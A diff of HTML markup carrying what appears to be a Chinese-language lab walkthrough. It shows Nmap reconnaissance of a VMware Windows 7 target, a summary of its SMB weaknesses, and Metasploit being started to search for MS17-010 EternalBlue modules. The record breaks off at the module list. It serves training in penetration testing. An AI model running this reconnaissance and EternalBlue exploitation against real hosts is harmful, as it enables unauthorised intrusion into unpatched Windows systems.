+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting Nmap 7.95 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2025-12-31 02:51 UTC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; 10.0.0.17
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.00047s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Not shown: &lt;span class="m"&gt;991&lt;/span&gt; closed tcp ports &lt;span class="o"&gt;(&lt;/span&gt;reset&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PORT STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;135/tcp open msrpc Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;445/tcp open microsoft-ds Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterprise &lt;span class="m"&gt;7600&lt;/span&gt; microsoft-ds &lt;span class="o"&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49152/tcp open msrpc Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49153/tcp open msrpc Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49154/tcp open msrpc Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49155/tcp open msrpc Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49156/tcp open msrpc Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49157/tcp open msrpc Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;MAC Address: 00:0C:29:10:6D:B7 &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Service Info: Host: ANKH-PC&lt;span class="p"&gt;;&lt;/span&gt; OS: Windows&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host script results:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; smb-os-discovery:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; OS: Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterprise &lt;span class="m"&gt;7600&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterprise 6.1&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; OS CPE: cpe:/o:microsoft:windows_7::-
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Computer name: Ankh-PC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; NetBIOS computer name: ANKH-PC&lt;span class="se"&gt;\x&lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Workgroup: WORKGROUP&lt;span class="se"&gt;\x&lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ System time: 2025-12-31T10:52:28+08:00
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_nbstat: NetBIOS name: ANKH-PC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:0c:29:10:6d:b7 &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; smb2-time:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; date: 2025-12-31T02:52:28
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ start_date: 2025-12-31T02:41:52
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; smb-security-mode:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; account_used: guest
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; authentication_level: user
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; challenge_response: supported
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ message_signing: disabled &lt;span class="o"&gt;(&lt;/span&gt;dangerous, but default&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; smb2-security-mode:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; 2:1:0:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ Message signing enabled but not required
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 69.41 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;靶机信息&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;IP地址&lt;/strong&gt;：10.0.0.17&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;主机状态&lt;/strong&gt;：在线（延迟 0.00047s）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：Windows 7 Enterprise 7600 (版本 6.1)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;主机名&lt;/strong&gt;：ANKH-PC&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;工作组&lt;/strong&gt;：WORKGROUP&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;MAC地址&lt;/strong&gt;：00:0C:29:10:6D:B7 (VMware 虚拟机)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;系统时间&lt;/strong&gt;：UTC+8 (北京时间)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;开放端口与服务&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;135/tcp&lt;/strong&gt; - Microsoft Windows RPC (MSRPC)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;139/tcp&lt;/strong&gt; - Microsoft Windows NetBIOS-SSN&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;445/tcp&lt;/strong&gt; - Microsoft-DS (SMB)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 7 Enterprise 7600&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;工作群组：WORKGROUP&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;49152-49157/tcp&lt;/strong&gt; - Microsoft Windows RPC (MSRPC)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;SMB安全评估&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;身份验证级别&lt;/strong&gt;：用户级&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;消息签名&lt;/strong&gt;：已启用但非必需（默认配置）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;签名状态&lt;/strong&gt;：已禁用（存在风险，但为默认设置，可能面临中间人攻击风险）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;尝试账户&lt;/strong&gt;：guest&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="metasploit扫描与漏洞利用"&gt;Metasploit扫描与漏洞利用
+&lt;/h3&gt;&lt;h4 id="一启动metasploit框架root"&gt;一、启动Metasploit框架（root）：
+&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;root㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Metasploit tip: Save the current environment with the save command,
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;future console restarts will use this environment again
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +-------------------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; METASPLOIT by Rapid7 &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +---------------------------+---------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; __________________ &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt;c&lt;span class="o"&gt;(&lt;/span&gt;______&lt;span class="o"&gt;(&lt;/span&gt;o&lt;span class="o"&gt;(&lt;/span&gt;______&lt;span class="o"&gt;(&lt;/span&gt;_&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="o"&gt;======[&lt;/span&gt;*** &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="o"&gt;)=&lt;/span&gt;&lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; EXPLOIT &lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; // &lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;_____________&lt;span class="se"&gt;\_&lt;/span&gt;______ &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; // &lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="o"&gt;==[&lt;/span&gt;msf &amp;gt;&lt;span class="o"&gt;]============&lt;/span&gt;&lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; // &lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;______________________&lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; // RECON &lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)&lt;/span&gt;/ &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; // &lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ********************* &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +---------------------------+---------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; o O o &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\&amp;#39;\/\/\/&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/ |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | o O | )======( |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | o | .&amp;#39;&lt;/span&gt; LOOT &lt;span class="s1"&gt;&amp;#39;. |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | |^^^^^^^^^^^^^^|l___ | / _||__ \ |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | | PAYLOAD |&amp;#34;&amp;#34;\___, | / (_||_ \ |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | |________________|__|)__| | | __||_) | |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | |(@)(@)&amp;#34;&amp;#34;&amp;#34;**|(@)(@)**|(@) | &amp;#34; || &amp;#34; |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | = = = = = = = = = = = = | &amp;#39;&lt;/span&gt;--------------&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +---------------------------+---------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;=[&lt;/span&gt; metasploit v6.4.69-dev &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ -- --&lt;span class="o"&gt;=[&lt;/span&gt; &lt;span class="m"&gt;2529&lt;/span&gt; exploits - &lt;span class="m"&gt;1302&lt;/span&gt; auxiliary - &lt;span class="m"&gt;432&lt;/span&gt; post &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ -- --&lt;span class="o"&gt;=[&lt;/span&gt; &lt;span class="m"&gt;1672&lt;/span&gt; payloads - &lt;span class="m"&gt;49&lt;/span&gt; encoders - &lt;span class="m"&gt;13&lt;/span&gt; nops &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ -- --&lt;span class="o"&gt;=[&lt;/span&gt; &lt;span class="m"&gt;9&lt;/span&gt; evasion &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Metasploit Documentation: https://docs.metasploit.com/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id="二搜索ms17-010模块"&gt;二、搜索&lt;code&gt;ms17-010&lt;/code&gt;模块：
+&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt; search ms17-010
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Matching &lt;span class="nv"&gt;Modules&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# Name Disclosure Date Rank Check Description&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - ---- --------------- ---- ----- -----------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;0&lt;/span&gt; exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Automatic Target . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows &lt;span class="m"&gt;7&lt;/span&gt; . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows Embedded Standard &lt;span class="m"&gt;7&lt;/span&gt; . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows Server &lt;span class="m"&gt;2008&lt;/span&gt; R2 . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows &lt;span class="m"&gt;8&lt;/span&gt; . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows 8.1 . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows Server &lt;span class="m"&gt;2012&lt;/span&gt; . . . .
